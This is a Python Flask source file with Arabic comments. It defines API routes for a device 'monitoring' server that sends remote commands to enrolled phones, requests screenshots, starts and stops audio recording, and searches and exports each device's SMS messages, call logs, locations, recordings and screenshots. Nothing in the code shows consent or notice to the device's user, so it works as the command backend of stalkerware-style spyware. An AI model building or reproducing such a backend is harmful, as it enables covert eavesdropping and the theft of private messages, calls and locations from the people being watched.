#!/usr/bin/env python3
"""
نقاط النهاية الإضافية لتطبيق المراقبة
Additional API Endpoints for Monitoring Application
"""

from flask import Blueprint, request, jsonify, send_file
from functools import wraps
import os
import json
import base64
from datetime import datetime, timedelta
import zipfile
import io
import csv

# إنشاء Blueprint
api_bp = Blueprint('api_extended', __name__)

def create_extended_routes(app, db_manager, auth_manager, file_manager, notification_manager):
    """إنشاء المسارات الإضافية"""
    
    def token_required(f):
        """مطلوب رمز المصادقة"""
        @wraps(f)
        def decorated(*args, **kwargs):
            token = request.headers.get('Authorization')
            
            if not token:
                return jsonify({'error': 'Token is missing'}), 401
            
            try:
                if token.startswith('Bearer '):
                    token = token[7:]
                
                payload = auth_manager.verify_token(token)
                if not payload:
                    return jsonify({'error': 'Token is invalid'}), 401
                
                request.current_user = payload
                
            except Exception as e:
                return jsonify({'error': 'Token is invalid'}), 401
            
            return f(*args, **kwargs)
        
        return decorated
    
    # Routes - Remote Control
    @api_bp.route('/api/remote/command', methods=['POST'])
    @token_required
    def send_remote_command():
        """إرسال أمر تحكم عن بعد"""
        try:
            data = request.get_json()
            device_id = data.get('device_id')
            command = data.get('command')
            parameters = data.get('parameters', {})
            
            if not device_id or not command:
                return jsonify({'error': 'Device ID and command are required'}), 400
            
            # حفظ الأمر في قاعدة البيانات
            command_id = db_manager.execute_insert(
                '''INSERT INTO activities 
                   (device_id, activity_type, description, data)
                   VALUES (?, ?, ?, ?)''',
                (device_id, 'remote_command', f'Remote command: {command}', 
                 json.dumps({'command': command, 'parameters': parameters}))
            )
            
            # إرسال الأمر عبر WebSocket
            notification_manager.send_notification(device_id, {
                'type': 'remote_command',
                'command_id': command_id,
                'command': command,
                'parameters': parameters,
                'timestamp': datetime.now().isoformat()
            })
            
            return jsonify({
                'success': True,
                'command_id': command_id,
                'message': 'Command sent successfully'
            })
        
        except Exception as e:
            return jsonify({'error': f'Failed to send command: {str(e)}'}), 500
    
    @api_bp.route('/api/remote/screenshot', methods=['POST'])
    @token_required
    def request_screenshot():
        """طلب لقطة شاشة فورية"""
        try:
            data = request.get_json()
            device_id = data.get('device_id')
            
            if not device_id:
                return jsonify({'error': 'Device ID is required'}), 400
            
            # إرسال طلب لقطة شاشة
            notification_manager.send_notification(device_id, {
                'type': 'screenshot_request',
                'timestamp': datetime.now().isoformat()
            })
            
            return jsonify({
                'success': True,
                'message': 'Screenshot request sent'
            })
        
        except Exception as e:
            return jsonify({'error': f'Failed to request screenshot: {str(e)}'}), 500
    
    @api_bp.route('/api/remote/audio/start', methods=['POST'])
    @token_required
    def start_audio_recording():
        """بدء تسجيل صوتي"""
        try:
            data = request.get_json()
            device_id = data.get('device_id')
            duration = data.get('duration', 60)  # مدة افتراضية 60 ثانية
            
            if not device_id:
                return jsonify({'error': 'Device ID is required'}), 400
            
            # إرسال أمر بدء التسجيل
            notification_manager.send_notification(device_id, {
                'type': 'start_audio_recording',
                'duration': duration,
                'timestamp': datetime.now().isoformat()
            })
            
            return jsonify({
                'success': True,
                'message': 'Audio recording started'
            })
        
        except Exception as e:
            return jsonify({'error': f'Failed to start recording: {str(e)}'}), 500
    
    @api_bp.route('/api/remote/audio/stop', methods=['POST'])
    @token_required
    def stop_audio_recording():
        """إيقاف تسجيل صوتي"""
        try:
            data = request.get_json()
            device_id = data.get('device_id')
            
            if not device_id:
                return jsonify({'error': 'Device ID is required'}), 400
            
            # إرسال أمر إيقاف التسجيل
            notification_manager.send_notification(device_id, {
                'type': 'stop_audio_recording',
                'timestamp': datetime.now().isoformat()
            })
            
            return jsonify({
                'success': True,
                'message': 'Audio recording stopped'
            })
        
        except Exception as e:
            return jsonify({'error': f'Failed to stop recording: {str(e)}'}), 500
    
    # Routes - Data Export
    @api_bp.route('/api/export/device/<device_id>', methods=['GET'])
    @token_required
    def export_device_data(device_id):
        """تصدير بيانات جهاز"""
        try:
            export_format = request.args.get('format', 'json')
            
            # جمع البيانات
            device_data = {}
            
            # معلومات الجهاز
            devices = db_manager.execute_query(
                'SELECT * FROM devices WHERE device_id = ?',
                (device_id,)
            )
            if devices:
                device_data['device_info'] = devices[0]
            
            # التسجيلات الصوتية
            audio_recordings = db_manager.execute_query(
                'SELECT * FROM audio_recordings WHERE device_id = ? ORDER BY recorded_at DESC',
                (device_id,)
            )
            device_data['audio_recordings'] = audio_recordings
            
            # لقطات الشاشة
            screenshots = db_manager.execute_query(
                'SELECT * FROM screenshots WHERE device_id = ? ORDER BY captured_at DESC',
                (device_id,)
            )
            device_data['screenshots'] = screenshots
            
            # الرسائل النصية
            sms_messages = db_manager.execute_query(
                'SELECT * FROM sms_messages WHERE device_id = ? ORDER BY timestamp DESC',
                (device_id,)
            )
            device_data['sms_messages'] = sms_messages
            
            # المكالمات
            call_logs = db_manager.execute_query(
                'SELECT * FROM call_logs WHERE device_id = ? ORDER BY timestamp DESC',
                (device_id,)
            )
            device_data['call_logs'] = call_logs
            
            # المواقع
            locations = db_manager.execute_query(
                'SELECT * FROM locations WHERE device_id = ? ORDER BY timestamp DESC',
                (device_id,)
            )
            device_data['locations'] = locations
            
            # الأنشطة
            activities = db_manager.execute_query(
                'SELECT * FROM activities WHERE device_id = ? ORDER BY timestamp DESC',
                (device_id,)
            )
            device_data['activities'] = activities
            
            if export_format == 'json':
                # تصدير JSON
                output = io.StringIO()
                json.dump(device_data, output, indent=2, default=str)
                output.seek(0)
                
                return send_file(
                    io.BytesIO(output.getvalue().encode()),
                    mimetype='application/json',
                    as_attachment=True,
                    download_name=f'device_{device_id}_data.json'
                )
            
            elif export_format == 'csv':
                # تصدير CSV
                output = io.StringIO()
                
                # كتابة معلومات الجهاز
                if device_data.get('device_info'):
                    output.write("Device Information\n")
                    writer = csv.DictWriter(output, fieldnames=device_data['device_info'].keys())
                    writer.writeheader()
                    writer.writerow(device_data['device_info'])
                    output.write("\n")
                
                # كتابة الرسائل النصية
                if device_data.get('sms_messages'):
                    output.write("SMS Messages\n")
                    writer = csv.DictWriter(output, fieldnames=device_data['sms_messages'][0].keys())
                    writer.writeheader()
                    writer.writerows(device_data['sms_messages'])
                    output.write("\n")
                
                # كتابة المكالمات
                if device_data.get('call_logs'):
                    output.write("Call Logs\n")
                    writer = csv.DictWriter(output, fieldnames=device_data['call_logs'][0].keys())
                    writer.writeheader()
                    writer.writerows(device_data['call_logs'])
                    output.write("\n")
                
                output.seek(0)
                
                return send_file(
                    io.BytesIO(output.getvalue().encode()),
                    mimetype='text/csv',
                    as_attachment=True,
                    download_name=f'device_{device_id}_data.csv'
                )
            
            else:
                return jsonify({'error': 'Unsupported export format'}), 400
        
        except Exception as e:
            return jsonify({'error': f'Failed to export data: {str(e)}'}), 500
    
    @api_bp.route('/api/export/files/<device_id>', methods=['GET'])
    @token_required
    def export_device_files(device_id):
        """تصدير ملفات جهاز مضغوطة"""
        try:
            # إنشاء ملف ZIP
            zip_buffer = io.BytesIO()
            
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                # إضافة التسجيلات الصوتية
                audio_recordings = db_manager.execute_query(
                    'SELECT * FROM audio_recordings WHERE device_id = ?',
                    (device_id,)
                )
                
                for recording in audio_recordings:
                    if os.path.exists(recording['file_path']):
                        zip_file.write(
                            recording['file_path'],
                            f"audio/{recording['filename']}"
                        )
                
                # إضافة لقطات الشاشة
                screenshots = db_manager.execute_query(
                    'SELECT * FROM screenshots WHERE device_id = ?',
                    (device_id,)
                )
                
                for screenshot in screenshots:
                    if os.path.exists(screenshot['file_path']):
                        zip_file.write(
                            screenshot['file_path'],
                            f"screenshots/{screenshot['filename']}"
                        )
            
            zip_buffer.seek(0)
            
            return send_file(
                zip_buffer,
                mimetype='application/zip',
                as_attachment=True,
                download_name=f'device_{device_id}_files.zip'
            )
        
        except Exception as e:
            return jsonify({'error': f'Failed to export files: {str(e)}'}), 500
    
    # Routes - Advanced Search
    @api_bp.route('/api/search', methods=['POST'])
    @token_required
    def advanced_search():
        """البحث المتقدم"""
        try:
            data = request.get_json()
            search_type = data.get('type')
            query = data.get('query', '')
            device_id = data.get('device_id')
            date_from = data.get('date_from')
            date_to = data.get('date_to')
            
            results = {}
            
            if search_type == 'sms' or search_type == 'all':
                # البحث في الرسائل النصية
                sql_query = '''
                    SELECT * FROM sms_messages 
                    WHERE (sender LIKE ? OR recipient LIKE ? OR message_body LIKE ?)
                '''
                params = [f'%{query}%', f'%{query}%', f'%{query}%']
                
                if device_id:
                    sql_query += ' AND device_id = ?'
                    params.append(device_id)
                
                if date_from:
                    sql_query += ' AND timestamp >= ?'
                    params.append(date_from)
                
                if date_to:
                    sql_query += ' AND timestamp <= ?'
                    params.append(date_to)
                
                sql_query += ' ORDER BY timestamp DESC LIMIT 100'
                
                results['sms_messages'] = db_manager.execute_query(sql_query, params)
            
            if search_type == 'calls' or search_type == 'all':
                # البحث في المكالمات
                sql_query = '''
                    SELECT * FROM call_logs 
                    WHERE (phone_number LIKE ? OR contact_name LIKE ?)
                '''
                params = [f'%{query}%', f'%{query}%']
                
                if device_id:
                    sql_query += ' AND device_id = ?'
                    params.append(device_id)
                
                if date_from:
                    sql_query += ' AND timestamp >= ?'
                    params.append(date_from)
                
                if date_to:
                    sql_query += ' AND timestamp <= ?'
                    params.append(date_to)
                
                sql_query += ' ORDER BY timestamp DESC LIMIT 100'
                
                results['call_logs'] = db_manager.execute_query(sql_query, params)
            
            if search_type == 'activities' or search_type == 'all':
                # البحث في الأنشطة
                sql_query = '''
                    SELECT * FROM activities 
                    WHERE (activity_type LIKE ? OR description LIKE ?)
                '''
                params = [f'%{query}%', f'%{query}%']
                
                if device_id:
                    sql_query += ' AND device_id = ?'
                    params.append(device_id)
                
                if date_from:
                    sql_query += ' AND timestamp >= ?'
                    params.append(date_from)
                
                if date_to:
                    sql_query += ' AND timestamp <= ?'
                    params.append(date_to)
                
                sql_query += ' ORDER BY timestamp DESC LIMIT 100'
                
                results['activities'] = db_manager.execute_query(sql_query, params)
            
            return jsonify({
                'success': True,
                'results': results
            })
        
        except Exception as e:
            return jsonify({'error': f'Search failed: {str(e)}'}), 500
    
    # Routes - Reports
    @api_bp.route('/api/reports/activity', methods=['GET'])
    @token_required
    def get_activity_report():
        """تقرير الأنشطة"""
        try:
            device_id = request.args.get('device_id')
            days = int(request.args.get('days', 7))
            
            date_from = (datetime.now() - timedelta(days=days)).isoformat()
            
            # إحصائيات الأنشطة
            query = '''
                SELECT 
                    activity_type,
                    COUNT(*) as count,
                    DATE(timestamp) as date
                FROM activities 
                WHERE timestamp >= ?
            '''
            params = [date_from]
            
            if device_id:
                query += ' AND device_id = ?'
                params.append(device_id)
            
            query += ' GROUP BY activity_type, DATE(timestamp) ORDER BY date DESC'
            
            activities = db_manager.execute_query(query, params)
            
            # إحصائيات الرسائل النصية
            query = '''
                SELECT 
                    COUNT(*) as count,
                    DATE(timestamp) as date
                FROM sms_messages 
                WHERE timestamp >= ?
            '''
            params = [date_from]
            
            if device_id:
                query += ' AND device_id = ?'
                params.append(device_id)
            
            query += ' GROUP BY DATE(timestamp) ORDER BY date DESC'
            
            sms_stats = db_manager.execute_query(query, params)
            
            # إحصائيات المكالمات
            query = '''
                SELECT 
                    call_type,
                    COUNT(*) as count,
                    SUM(duration) as total_duration,
                    DATE(timestamp) as date
                FROM call_logs 
                WHERE timestamp >= ?
            '''
            params = [date_from]
            
            if device_id:
                query += ' AND device_id = ?'
                params.append(device_id)
            
            query += ' GROUP BY call_type, DATE(timestamp) ORDER BY date DESC'
            
            call_stats = db_manager.execute_query(query, params)
            
            return jsonify({
                'success': True,
                'report': {
                    'activities': activities,
                    'sms_stats': sms_stats,
                    'call_stats': call_stats,
                    'period': f'{days} days',
                    'generated_at': datetime.now().isoformat()
                }
            })
        
        except Exception as e:
            return jsonify({'error': f'Failed to generate report: {str(e)}'}), 500
    
    # Routes - Settings Management
    @api_bp.route('/api/settings', methods=['GET'])
    @token_required
    def get_settings():
        """الحصول على الإعدادات"""
        try:
            settings = db_manager.execute_query('SELECT * FROM settings')
            
            settings_dict = {}
            for setting in settings:
                settings_dict[setting['key']] = {
                    'value': setting['value'],
                    'description': setting['description'],
                    'updated_at': setting['updated_at']
                }
            
            return jsonify({
                'success': True,
                'settings': settings_dict
            })
        
        except Exception as e:
            return jsonify({'error': f'Failed to fetch settings: {str(e)}'}), 500
    
    @api_bp.route('/api/settings', methods=['PUT'])
    @token_required
    def update_settings():
        """تحديث الإعدادات"""
        try:
            data = request.get_json()
            
            for key, value in data.items():
                # تحديث أو إدراج الإعداد
                existing = db_manager.execute_query(
                    'SELECT id FROM settings WHERE key = ?',
                    (key,)
                )
                
                if existing:
                    db_manager.execute_query(
                        'UPDATE settings SET value = ?, updated_at = CURRENT_TIMESTAMP WHERE key = ?',
                        (str(value), key)
                    )
                else:
                    db_manager.execute_query(
                        'INSERT INTO settings (key, value) VALUES (?, ?)',
                        (key, str(value))
                    )
            
            return jsonify({
                'success': True,
                'message': 'Settings updated successfully'
            })
        
        except Exception as e:
            return jsonify({'error': f'Failed to update settings: {str(e)}'}), 500
    
    # تسجيل Blueprint
    app.register_blueprint(api_bp)
    
    return api_bp

